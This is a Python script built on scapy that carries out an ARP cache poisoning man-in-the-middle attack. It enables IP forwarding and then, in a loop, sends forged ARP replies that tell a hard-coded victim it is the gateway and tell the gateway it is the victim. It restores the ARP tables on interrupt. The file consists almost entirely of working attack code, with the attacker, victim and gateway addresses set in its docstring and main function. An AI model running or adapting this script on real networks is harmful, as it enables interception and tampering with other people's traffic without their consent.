"""
GW: 10.211.55.1
attacker:  10.211.55.3
victim: 10.211.55.7
"""

from scapy.all import Ether, ARP, srp, send
import argparse
import time
import os
import sys

def _enable_linux_iproute():
    """
    Enables IP route ( IP Forward ) in linux-based distro
    """
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 1:
            # already enabled
            return
    with open(file_path, "w") as f:
        print(1, file=f)
        
def get_mac(ip):
    """
    Returns MAC address of any device connected to the network
    If ip is down, returns None instead
    """
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip),
                 timeout=3, verbose=0)
    if ans:
        return ans[0][1].src
        
def spoof(target_ip, host_ip, attack_mac, verbose=True):
    """
    Spoofs `target_ip` saying that we are `host_ip`.
    it is accomplished by changing the ARP cache of the target (poisoning)
    """
    # get the mac address of the target
    target_mac = get_mac(target_ip)
    # craft the arp 'is-at' operation packet, in other words; 
    # an ARP response
    # we don't specify 'hwsrc' (source MAC address)
    # because by default, 'hwsrc' is the real MAC address 
    #of the sender (ours)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, 
                        psrc=host_ip, op='is-at')
    # send the packet
    # verbose = 0 means that we send the packet without printing any thing
    send(arp_response, verbose=0)
    
    if verbose:
        # get the MAC address of the default interface we are using
        self_mac = attack_mac
        print("[+] Sent to {} : {} is-at {}".
                format(target_ip, host_ip, self_mac))
                
def restore(target_ip, host_ip, verbose=True):
    """
    Restores the normal process of a regular network
    This is done by sending the original informations 
    (real IP and MAC of `host_ip` ) to `target_ip`
    """
    # get the real MAC address of target
    target_mac = get_mac(target_ip)
    # get the real MAC address of spoofed (gateway, i.e router)
    host_mac = get_mac(host_ip)
    # crafting the restoring packet
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, 
                        psrc=host_ip, hwsrc=host_mac)
    # sending the restoring packet
    # to restore the network to its normal process
    # we send each reply seven times for a good measure (count=7)
    send(arp_response, verbose=0, count=7)
    if verbose:
        print("[+] Sent to {} : {} is-at {}".format(target_ip,
                host_ip, host_mac))

def main():

    _enable_linux_iproute()
    
    gw_ip = "10.37.129.7"
    #attacker_ip = "10.211.55.3"
    victim_ip = "10.37.129.8"
    attacker_hw = "00:1c:42:b6:ee:f1"
    verbose = True
    
    try:
        while True:
            # telling the `target` that we are the `gateway`
            spoof(victim_ip, gw_ip, attacker_hw,  verbose)
            # telling the `gateway` that we are the `target`
            spoof(gw_ip, victim_ip, attacker_hw,  verbose)
            # sleep for one second
            time.sleep(1)
    except KeyboardInterrupt:
        print("[!] Detected CTRL+C ! restoring the network, please wait...")
        restore(victim_ip, gw_ip)
        restore(gw_ip, victim_ip)


    return 0

if __name__ == "__main__":
    main()
